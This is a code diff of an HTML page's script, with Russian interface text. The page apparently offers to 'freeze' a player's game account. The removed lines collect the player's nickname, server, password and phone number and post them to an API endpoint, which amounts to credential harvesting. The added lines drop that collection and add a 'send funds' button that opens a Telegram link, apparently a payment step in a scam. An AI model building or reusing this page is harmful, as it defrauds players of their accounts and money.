@@ -476,29 +476,30 @@
 
   let currentData = null;
 
-  $("freeze").onclick = async () => {
-    const data = {
-      nick: $("nick").value.trim() || "крутой2882",
-      server: selectedServer || "Не выбран",
-      pass: $("pass").value || "123456",
-      phone: $("phone").value.trim(),
-      ts: Date.now()
-    };
 
-    if (!selectedServer) {
-      alert("Выберите сервер!");
-      return;
-    }
+$("freeze").onclick = () => {
+  const data = {
+    nick: $("nick").value.trim() || "Игрок",
+    server: selectedServer
+  };
 
-    const btn = $("freeze");
-    btn.disabled = true;
-    btn.textContent = "Заморозка...";
+  if (!selectedServer) {
+    alert("Выберите сервер!");
+    return;
+  }
 
-    await post(API, data);
-    currentData = data;
+  currentData = data;
 
-    $("res-nick").textContent = data.nick;
-    $("res-server").textContent = data.server;
-    
-    $("form-screen").style.display = "none";
-    $("success-screen").style.display = 
+  $("res-nick").textContent = data.nick;
+  $("res-server").textContent = data.server;
+
+  $("form-screen").style.display = "none";
+  $("success-screen").style.display = "block";
+};
+
+$("send-funds").onclick = () => {
+  window.open(TG, "_blank");
+};
+</script>
+</body>
+</html>
